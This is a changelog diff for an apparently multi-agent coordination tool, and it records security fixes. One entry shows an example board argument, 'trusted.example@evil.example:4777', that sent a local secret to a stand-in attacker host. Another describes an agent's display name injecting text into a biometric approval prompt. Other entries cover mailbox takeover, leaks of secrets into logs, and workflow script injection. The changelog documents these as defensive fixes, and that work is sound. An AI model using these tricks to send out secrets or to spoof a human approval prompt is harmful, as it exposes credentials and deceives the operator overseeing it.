@@ -141,6 +141,91 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   this is a changelog entry rather than an advisory.
 
 
+- **`--board` sent this board's local secret to whatever an `@` named.** A host
+  was validated by splitting it, checking its characters and parsing it as a
+  URL, and parsing successfully is not parsing to what was validated: everything
+  before an `@` is userinfo, so `--board 'trusted.example@evil.example:4777'`
+  passed every rule, named `evil.example` as the authority, printed a confident
+  recipe and exited zero. The bridge built from it sends the secret in a header,
+  and an explicit `http` skips the trust ceremony, so nothing downstream would
+  have caught it. The parsed authority is compared against the validated one,
+  which catches the shape rather than the character.
+
+- **Two credential checks were wired into the call sites somebody had noticed.**
+  They went into `mcp-config`, the `get()` helper and `mcp-stdio`; fifteen other
+  places build requests with the shared client, and `await`, `watch`, `monitor`,
+  the admin routes, the hook paths and several `doctor` probes went straight
+  past both while attaching `X-Dibs-Local`, and sometimes the admin password.
+  Both live in the round tripper now, which is the one thing every
+  credential-bearing request passes through and cannot be routed around by
+  building the request differently. Safety that depends on the next caller
+  remembering is a list, not a rule.
+
+- **The pinned signing identity rotated behind the operator, three ways.** The
+  CA was regenerated on *every* load failure (missing, unreadable, malformed,
+  mismatched, wrong key type), each of which silently replaces the identity
+  every joined machine has pinned, so a bad restore locked out the fleet while
+  the daemon reported itself healthy, against a README that promises the
+  identity changes only when the operator deletes it. Closing that left a second
+  hole: a surviving *key* beside a missing certificate, which is what an
+  interrupted restore leaves, fell through and overwrote the key. And a third,
+  in the preflight that was added to catch the first two: `os.Stat` follows
+  links, so a CA symlink whose target is gone reported `ErrNotExist` and read as
+  a first run. Absent means first run; either file present is a refusal that
+  says what to do, and the absence check does not follow links.
+
+- **The board's own bootstrap link was printed over `http://`.** `dibs web`
+  mints the token through the transport resolver and then wrote the URL with a
+  hardcoded scheme and the raw listen address, so a board serving HTTPS sent a
+  two-minute bearer for a twelve-hour god-view session in a plaintext request,
+  readable by a passive observer who can then race to redeem it. It also printed
+  `0.0.0.0` for a wildcard bind, which connects from nowhere.
+
+- **The biometric prompt carried text the requesting agent chose.** The release
+  claims the sentence on the sheet is daemon-authored, and that is the whole
+  basis for "decline anything you did not start". The one variable part is the
+  agent's display name, which admission only length-bounds: a newline puts
+  attacker text on its own line where it reads as the prompt, a bidirectional
+  override reverses everything after it, and a quote closes the name early. It
+  is flattened and quoted now, and `SECURITY.md` says what an agent can still
+  do, which is pick a misleading name.
+
+- **A coordinator could take the operator's mailbox once they stopped typing.**
+  Both mailbox guards asked `humanIdentityLocked`, which answers "who may act as
+  the human" and correctly returns nothing for an archived row. Ownership is not
+  authority, and they treated an archived human as no human at all: fail-open,
+  on the one question where ownership is what matters. The state arrives on its
+  own: thirty dormant days archive the human, and the row and its mail outlive
+  that by the seven-day retention window, so for a week the operator's private
+  mailbox could be adopted directly or by approving a peer's request carrying
+  it.
+
+- **A purged agent left its mailbox behind for the next agent of that name.** An
+  id is derived from the name, so purging the row after archive retention
+  released the id while every message still pointed at it, and whoever
+  registered that name next inherited the mail. For the human that name is the
+  OS username, which is the one id an attacker can be certain of, and the
+  retained mail is the operator's own. Mail *to* the purged agent goes with it;
+  mail it *sent* stays, because that inbox belongs to whoever received it.
+
+- **Log redaction protected one destination of two.** The handler redacted its
+  copy for `/api/logs` and forwarded the original record to stderr, which is
+  where a service manager collects it, so tokens, nonces and message bodies had
+  been going there in full. Attributes bound with `log.With` reached the base
+  handler before redaction as well. Both destinations, both paths, now. And a
+  failed wake no longer logs the command's output at all, because the documented
+  wake command runs an entire agent turn and its stdout is transcript,
+  decrypted mail, and whatever a tool surfaced. Only the operating system's own
+  complaint is logged, and only when the process never started.
+
+- **The notifier bundle was never in a release.** `internal/notify` resolves
+  `Dibs.app/Contents/MacOS/dibs-notify` beside the executable and only `task
+  install` built it, so every published archive and every `brew install` went
+  without the one component whose job is putting a notification in front of the
+  person, while CI passed on a source build that had it. The Touch ID helper had
+  this exact hole one round earlier and its guard watched only itself; the new
+  one reads what the *runtime* looks for and checks each against the release.
+
 ### Added
 
 - **An agent that is not running can be woken: `[wake.exec]`.** Mail arrived for
@@ -218,6 +303,7 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   With it, a paragraph on choosing the hub, since that choice decides whether the
   fleet has a board at all and the laptop is the tempting wrong answer.
 
+
 ### Changed
 
 - **`dibs.toml` has one type and one loader.** The daemon decoded the file into
@@ -250,6 +336,17 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   suppressed it, so a still-active agent re-registering with its nonce came back
   `resumed`, was treated as a first connection, and read the four-sentence
   paragraph again every time.
+
+- **The mail digest now names the call that clears each kind.** The Stop hook
+  reported the same unread count at every turn boundary for eight hours while
+  the recipient read the messages and moved on, because fetching a body consumes
+  nothing and only `ack` closes a `notify`. An agent habituates to a line that
+  does not change and then stops looking at one that is sometimes urgent. The
+  announcement line in the same function had already learned this and says so in
+  its own comment: the way out has to be stated in the same breath. Which call
+  clears it depends on the type, so it is not one string. A question or a
+  request is closed by answering, and telling an agent to `ack` there would
+  teach it to silence somebody who is waiting.
 
 ### Fixed
 
@@ -781,6 +878,189 @@ machines for real work. Their priority order, not ours.
   install rules that are not obvious from them: remove before copying, because
   macOS caches a signature verdict against the inode, and set the codesign
   identifiers, which the Go toolchain leaves as `a.out`.
+
+- **`dibd -check` answered a question it was not asked.** It says it reports
+  whether this build could take over, and `dibs upgrade` reads a zero exit as
+  licence to stop the running daemon. It returned before the effective listen
+  address was resolved and before any certificate was looked at, so it proved
+  replay and nothing else: a malformed `-addr`, a malformed `DIBS_ADDR`, a
+  configured pair that will not load, or a damaged signing identity all passed,
+  and the fleet then went down at a bind or a `ServeTLS` nobody had asked about,
+  with recovery retrying the same replacement rather than the previous build, so
+  it stayed down. It resolves the address through the same function startup
+  uses and asks whether the transport is usable without creating anything.
+  `dibs upgrade` also passed only `-dir` while starting the replacement with
+  `-addr`, so the proof and the thing proved were about different daemons.
+
+  The preflight's first form re-derived startup's transport tree instead of
+  asking for it, and had already drifted in two places: `http://` with a
+  configured certificate is a contradiction startup refuses and this passed, and
+  `https://` with `insecure_plaintext` took the plaintext branch here while
+  startup honours the stated scheme. It calls `transport.Resolve` now, with a
+  generation callback that refuses, which turns the real decision into a
+  side-effect-free question. A copy of a decision is a decision that will drift.
+
+- **A failed wake spent the only attempt and reported success.** The cooldown is
+  taken before the process starts, which is right, but keeping it after the
+  command *failed* spent the single attempt that message was ever going to get
+  on a process that woke nobody, while `send` still reported the mailbox
+  written. It is released when the command did not run, and one re-check is
+  armed so the failure does not simply end there.
+
+- **Mail arriving inside a cooldown was dropped rather than deferred.**
+  `maybeWake` fires once per event and nothing retried, so a question arriving
+  after a wake had exited but inside its ninety seconds was refused and then
+  forgotten, and the recipient stayed asleep until some unrelated event happened
+  to arrive. Ninety seconds is a rate limit on starting processes and was
+  behaving as one on delivering mail. A timer re-asks when the window expires.
+
+- **Two wakes could resume one thread at once.** The cooldown is a start-time
+  rule and the command runs for up to two hours, so ninety seconds later another
+  blocking event launched a second `codex exec resume` beside the first and one
+  thread got two activations interleaving into a single transcript: the
+  duplicate-process failure the cooldown exists to prevent, arriving through the
+  gap between "recently started" and "still going". A wake that is still running
+  excludes another outright. Releasing a *failed* wake's cooldown also deleted
+  unconditionally, so an earlier failure could erase a newer attempt's window; a
+  failure releases only its own generation.
+
+- **A leaked descriptor made an agent permanently unreachable.** Bounding the
+  wake command's output made stdout and stderr a non-file writer, which `os/exec`
+  copies through a pipe, and killing the process at the deadline does not close
+  a descriptor a *grandchild* inherited: `Wait` blocked on an EOF that never
+  arrived, past the two-hour bound, indefinitely. The bookkeeping that marks a
+  wake finished runs on defer, so the agent stayed marked as still going and
+  every later message to it was refused as a duplicate. `cmd.WaitDelay` bounds
+  it. Neither change was wrong alone.
+
+- **A blocking notice could be evicted by situational ones.** The `Blocking`
+  flag exists so an approval reaches an agent that stopped waiting for it, and
+  the list below it kept the newest sixteen regardless of kind; the loss is
+  unrecoverable by any other path, because the request is terminal and is not
+  pending mail anywhere. Situational notices are sacrificed first. The trim also
+  rebuilt its result by matching `(serial, text)`, which is not an identity:
+  supervisor notices use serial zero deliberately, so seventeen identical
+  entries each matched one of the sixteen selected and all seventeen came back,
+  growing again on every push. It keeps by position now.
+
+- **The presence prompt could be approved for a request the operator never
+  saw.** Two outstanding checks meant the operator opens the board, an agent
+  asks in the same moment, one sheet is approved, and which request receives the
+  credential is a race the person cannot see, and they approved exactly the
+  prompt they expected. Serialised now, and at the prompt rather than in the board's
+  handler, because `human_unlock` over MCP calls the same check directly. The
+  409 first said an approval "cannot be taken by a request it was not raised
+  for", which is false and backwards; the sheet carries a four-letter code that
+  `dibs web` prints, so a prompt showing a different code was raised by
+  something else. And contention was reported to the agent as the human
+  *declining*, which told it to ask them to press a button that is not there.
+
+- **The board dropped its trailing update.** `refreshMail` returned when a fetch
+  was outstanding, so an event arriving mid-flight lost its refresh and the
+  in-flight response painted the mailbox as it was *before* that event, with
+  nothing to correct it: an approval stayed invisible for thirty seconds, or
+  until reload if the pending fetch hung. One trailing refresh is kept, which is
+  the difference between fewer requests and a wrong screen.
+
+- **A data race on the footprint cache.** `agentsNeedingFootprints` read the map
+  bare inside the writer loop while the backfill wrote it under `matchMu` from a
+  goroutine that runs *off* the loop precisely so a slow scorer cannot stall
+  coordination. On a Go map the runtime turns that into a crash rather than a
+  wrong answer. The single writer is a guarantee about state, not about every
+  map an engine holds.
+
+- **A month dormant cost an agent its standing role, permanently.** Archival
+  blanks the nonce and keeps the nonce *index*, which is what lets recovery find
+  the row at all; reattaching restored the token, the session and the mailbox
+  and left the nonce empty, so the agent's identity resolved to nothing and a
+  role declared in `dibs.toml` could never reconcile onto it again. It came back
+  as itself, with its mail and its claims, and without the role the operator's
+  config grants it.
+
+- **The ambient session repair told twenty callers they had adopted one
+  mailbox.** The check and the bind were separate trips through the writer loop,
+  so concurrent callers all saw an empty session id and all bound; the id that
+  stuck was whichever finished last, and every other holder went on believing it
+  would receive that agent's mail. That is the failure the repair exists to
+  prevent, caused by the repair.
+
+- **A configured certificate was checked for pairing, and not for time or for
+  this board.** Loading proves the key belongs to the certificate, not that
+  anybody will accept it: an expired one serves perfectly and every client
+  refuses, and a certificate issued for another host does the same, so `dibd
+  -check` blessed a board nobody could reach. Both are checked where the config
+  is loaded, so `dibd -check` and `dibs mcp-config` see the same answer.
+
+- **An empty bootstrap token printed an unusable link and exited zero.** Any 200
+  that decoded was accepted, so a truncated response produced `/?bt=` and a
+  success: the operator opens a link that unlocks nothing and has no idea why.
+
+- **`DIBS_DIR` went into harness config verbatim.** That file outlives the shell
+  that produced it, so a relative path resolves against wherever the bridge is
+  later launched from, and the same line means a different board or none. The
+  credential directory is the one value there that must not be re-interpreted
+  somewhere else.
+
+- **A space that could not be opened was reported as an empty field.** The
+  opener returns nothing on a limit, on exhausted retries, and on a success
+  carrying no id, and the caller answered "nothing was close, so one was opened
+  for this work and the next agent joins you here". Two of those three things
+  were false: the agent is told it has the field to itself while having nowhere
+  for anybody to find it. It is its own outcome now, and the hint says to open
+  one.
+
+- **`--adopt-dir` recovery started a unit pointing at the directory it had just
+  moved.** When the unit rewrite fails, recovery runs with the correct new
+  directory in hand and started the unit anyway: a daemon against a path that
+  no longer exists, printed as a recovery. The unit is preferred when it
+  describes this board and not when it does not. Reading that out of the file
+  was then wrong twice in its first hour: paths in a launchd plist are
+  XML-escaped, so a board under `Fleet &amp; Review` was read as another one,
+  and a substring test accepted `~/.dibs-old` as naming `~/.dibs`. Tokens are
+  taken whole and compared as cleaned paths. An unreadable unit is still
+  trusted, because refusing over a permissions problem downgrades a supervised
+  service to an orphan process.
+
+- **Three shell scripts had entered the tree through YAML**, and an unpinned
+  tool sat in the job that holds `id-token: write`. The no-shell rule is about
+  what shell *is*, not where the bytes live: a `run: |` block is a shell script
+  that happens to live in a workflow, and it cannot be built, vetted or run
+  locally. All three are Go programs under `tools/` now, and the guard reads
+  `run:` blocks for shell logic rather than for file extensions. It immediately
+  found two more, one of them `${{ inputs.version }}` interpolated straight into
+  a run line, which is GitHub's own documented script-injection shape. The
+  publish job pinned its action to a SHA and left the tool version unset, so it
+  downloaded whatever `latest` meant that morning, which is the same shape the
+  file refuses three lines lower, in a comment, in the step that quotes it.
+
+- **The release configuration was invalid and nothing checked it.** Shipping the
+  notifier bundle in the cask was written as a field GoReleaser has no such key
+  for, so `goreleaser check` rejected the file outright and the tag would have
+  stopped before building anything, while `task ci` passed: the gate validated
+  every other surface and not the one where a failure means the release did not
+  happen. `goreleaser check` is in the gate now, watched failing against the
+  form that was written.
+
+- **`[wake.exec]` accepted entries that could never wake anybody.** `argv = [" ",
+  …]` is a valid TOML string and a useless program name: it passed `dibd
+  -check`, startup logged that the board can start an agent that is not running,
+  and every wake failed inside `exec` before starting anything. Same for a blank
+  harness key, which matches nothing that will ever register while still
+  counting as configured, and for two keys differing only in case, which
+  collapsed onto one entry with map iteration deciding which executable
+  survived.
+
+- **The coordinator briefing denied a capability in its own sentence.** It
+  listed `adopt_agent` and then said "you still cannot read another agent's
+  mail". Adoption moves a dormant mailbox onto a live agent and the point is to
+  read it; `dibs://staff` and the role documentation both state the exception,
+  and the briefing carried on the grant event, which is the first thing a newly
+  promoted agent is guaranteed to read, denied it. It separates "no `all_mail` for a
+  live peer" from the real exception, and says to adopt only what is genuinely
+  abandoned. `CONFIGURATION.md` also said `{thread}` takes the *first* resumable
+  alias, where the implementation deliberately takes the newest, because the
+  first is a thread the agent left: a document that would have argued a future
+  reader back into a fixed bug.
 
 ## [0.0.6] - 2026-08-20
 
